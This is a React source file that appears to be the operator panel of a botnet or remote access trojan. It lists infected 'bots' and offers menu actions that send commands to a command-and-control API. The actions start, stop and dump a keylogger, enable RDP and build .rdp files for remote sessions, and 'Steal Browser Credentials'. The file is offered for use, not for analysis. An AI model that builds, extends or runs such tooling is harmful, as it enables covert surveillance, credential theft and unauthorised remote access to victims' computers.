"use client";

import {
  MoreHorizontal,
  Terminal,
  Info,
  RefreshCw,
  Smartphone,
  Laptop,
  Globe,
  Cpu,
  Play,
  Square,
  Download,
  Monitor,
  KeyRound,
} from "lucide-react";
import { useState } from "react";
import { toast } from "sonner";

import { Button } from "@/components/ui/button";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Bot, OSType } from "@/types/types";

interface BotRowActionsProps {
  bot: Bot;
  onOpenTerminal: (bot: Bot) => void;
}

const getOsIcon = (os: OSType) => {
  switch (os) {
    case "windows":
    case "linux":
    case "macos":
      return <Laptop className="h-4 w-4" />;
    case "android":
    case "ios":
      return <Smartphone className="h-4 w-4" />;
    default:
      return <Globe className="h-4 w-4" />;
  }
};

export function BotRowActions({ bot, onOpenTerminal }: BotRowActionsProps) {
  const [showDetails, setShowDetails] = useState(false);

  const handleRestart = () => {
    toast.promise(new Promise((resolve) => setTimeout(resolve, 2000)), {
      loading: `Restarting agent on ${bot.hostname}...`,
      success: `Agent ${bot.hostname} restarted successfully`,
      error: "Failed to restart agent",
    });
  };

  const handleKeyloggerStart = async () => {
    try {
      const response = await fetch(
        `http://localhost:8080/api/command/${bot.id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "KeyloggerStart" }),
        },
      );
      if (response.ok) {
        toast.success(`Keylogger started on ${bot.hostname}`);
      } else {
        toast.error("Failed to start keylogger");
      }
    } catch (error) {
      toast.error("Error sending command");
    }
  };

  const handleKeyloggerStop = async () => {
    try {
      const response = await fetch(
        `http://localhost:8080/api/command/${bot.id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "KeyloggerStop" }),
        },
      );
      if (response.ok) {
        toast.success(`Keylogger stopped on ${bot.hostname}`);
      } else {
        toast.error("Failed to stop keylogger");
      }
    } catch (error) {
      toast.error("Error sending command");
    }
  };

  const handleKeyloggerDump = async () => {
    try {
      const response = await fetch(
        `http://localhost:8080/api/command/${bot.id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "KeyloggerDump" }),
        },
      );
      if (response.ok) {
        toast.success(`Retrieving keylog from ${bot.hostname}`);
      } else {
        toast.error("Failed to retrieve keylog");
      }
    } catch (error) {
      toast.error("Error sending command");
    }
  };

  const handleEnableRDP = async () => {
    try {
      const response = await fetch(
        `http://localhost:8080/api/command/${bot.id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "EnableRDP" }),
        },
      );
      if (response.ok) {
        toast.success(`Enabling RDP on ${bot.hostname}`);
      } else {
        toast.error("Failed to enable RDP");
      }
    } catch (error) {
      toast.error("Error sending command");
    }
  };

  const handleDisableRDP = async () => {
    try {
      const response = await fetch(
        `http://localhost:8080/api/command/${bot.id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "DisableRDP" }),
        },
      );
      if (response.ok) {
        toast.success(`Disabling RDP on ${bot.hostname}`);
      } else {
        toast.error("Failed to disable RDP");
      }
    } catch (error) {
      toast.error("Error sending command");
    }
  };

  const handleStealCreds = async () => {
    try {
      const response = await fetch(
        `http://localhost:8080/api/command/${bot.id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "StealCreds" }),
        },
      );
      if (response.ok) {
        toast.success(`Stealing credentials from ${bot.hostname}`);
      } else {
        toast.error("Failed to steal credentials");
      }
    } catch (error) {
      toast.error("Error sending command");
    }
  };

  const handleConnectRDP = () => {
    if (!bot.ip || bot.ip === "unknown" || bot.ip === "gist-channel") {
      toast.error("Cannot connect: Agent IP is unknown or masked");
      return;
    }

    // RDP File Content
    const rdpContent = [
      `full address:s:${bot.ip}`,
      "prompt for credentials:i:1",
      "administrative session:i:1",
      "screen mode id:i:2",
      "span monitors:i:1",
      "multimon:i:1",
    ].join("\n");

    try {
      const blob = new Blob([rdpContent], { type: "application/x-rdp" });
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `connect_${bot.hostname}.rdp`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      window.URL.revokeObjectURL(url);
      toast.success(`Launching RDP connection to ${bot.ip}`);
    } catch (e) {
      toast.error("Failed to generate RDP file");
      console.error(e);
    }
  };

  return (
    <>
      <DropdownMenu>
        <DropdownMenuTrigger asChild>
          <Button variant="ghost" className="h-8 w-8 p-0">
            <span className="sr-only">Open menu</span>
            <MoreHorizontal className="h-4 w-4" />
          </Button>
        </DropdownMenuTrigger>
        <DropdownMenuContent align="end">
          <DropdownMenuLabel>Actions</DropdownMenuLabel>
          <DropdownMenuItem onClick={() => onOpenTerminal(bot)}>
            <Terminal className="mr-2 h-4 w-4" />
            Open Terminal
          </DropdownMenuItem>
          <DropdownMenuItem onClick={() => setShowDetails(true)}>
            <Info className="mr-2 h-4 w-4" />
            View Details
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuLabel className="text-xs text-zinc-500">
            Keylogger
          </DropdownMenuLabel>
          <DropdownMenuItem onClick={handleKeyloggerStart}>
            <Play className="mr-2 h-4 w-4 text-green-500" />
            Start Keylogger
          </DropdownMenuItem>
          <DropdownMenuItem onClick={handleKeyloggerStop}>
            <Square className="mr-2 h-4 w-4 text-red-500" />
            Stop Keylogger
          </DropdownMenuItem>
          <DropdownMenuItem onClick={handleKeyloggerDump}>
            <Download className="mr-2 h-4 w-4 text-blue-500" />
            Dump Keylog
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuLabel className="text-xs text-zinc-500">
            Remote Access
          </DropdownMenuLabel>
          <DropdownMenuItem onClick={handleEnableRDP}>
            <Monitor className="mr-2 h-4 w-4 text-green-500" />
            Enable RDP
          </DropdownMenuItem>
          <DropdownMenuItem onClick={handleDisableRDP}>
            <Monitor className="mr-2 h-4 w-4 text-red-500" />
            Disable RDP
          </DropdownMenuItem>
          <DropdownMenuItem onClick={handleConnectRDP}>
            <Monitor className="mr-2 h-4 w-4 text-blue-500" />
            Connect via RDP (.rdp)
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuLabel className="text-xs text-zinc-500">
            Credential Theft
          </DropdownMenuLabel>
          <DropdownMenuItem onClick={handleStealCreds}>
            <KeyRound className="mr-2 h-4 w-4 text-yellow-500" />
            Steal Browser Credentials
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuItem onClick={handleRestart}>
            <RefreshCw className="mr-2 h-4 w-4" />
            Restart Agent
          </DropdownMenuItem>
        </DropdownMenuContent>
      </DropdownMenu>

      <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent className="sm:max-w-[425px] bg-zinc-950 text-white border-zinc-800">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              {getOsIcon(bot.os)}
              {bot.hostname}
            </DialogTitle>
            <DialogDescription className="text-zinc-400">
              Bot ID: {bot.id}
            </DialogDescription>
          </DialogHeader>
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div className="space-y-1">
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-semibold">
                  Status
                </p>
                <div
                  className={`inline-flex items-center rounded-full px-2 py-1 text-xs font-medium ring-1 ring-inset ${
                    bot.status === "online"
                      ? "bg-green-500/10 text-green-400 ring-green-500/20"
                      : bot.status === "offline"
                        ? "bg-red-400/10 text-red-400 ring-red-400/20"
                        : "bg-yellow-400/10 text-yellow-400 ring-yellow-400/20"
                  }`}
                >
                  {bot.status}
                </div>
              </div>
              <div className="space-y-1">
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-semibold">
                  IP Address
                </p>
                <p className="font-mono">{bot.ip}</p>
              </div>
              <div className="space-y-1">
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-semibold">
                  Location
                </p>
                <p>{bot.location}</p>
              </div>
              <div className="space-y-1">
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-semibold">
                  OS
                </p>
                <p className="capitalize">{bot.os}</p>
              </div>
              <div className="col-span-2 space-y-1">
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-semibold">
                  System Load
                </p>
                <div className="grid grid-cols-2 gap-2 mt-1">
                  <div className="bg-zinc-900 p-2 rounded border border-zinc-800 flex flex-col justify-center items-center">
                    <Cpu className="h-4 w-4 mb-1 text-blue-400" />
                    <span className="text-xs text-zinc-400">CPU</span>
                    <span className="font-bold">
                      {bot.stats?.cpuUsage || 0}%
                    </span>
                  </div>
                  <div className="bg-zinc-900 p-2 rounded border border-zinc-800 flex flex-col justify-center items-center">
                    <div className="h-4 w-4 mb-1 text-purple-400 font-bold text-center text-xs border border-purple-400 rounded-sm flex items-center justify-center">
                      M
                    </div>
                    <span className="text-xs text-zinc-400">RAM</span>
                    <span className="font-bold">
                      {bot.stats?.memoryUsage || 0}%
                    </span>
                  </div>
                </div>
              </div>
              <div className="col-span-2 space-y-1">
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-semibold">
                  Tags
                </p>
                <div className="flex flex-wrap gap-1">
                  {bot.tags?.map((tag) => (
                    <span
                      key={tag}
                      className="px-2 py-0.5 bg-zinc-800 rounded text-xs text-zinc-300"
                    >
                      {tag}
                    </span>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
}
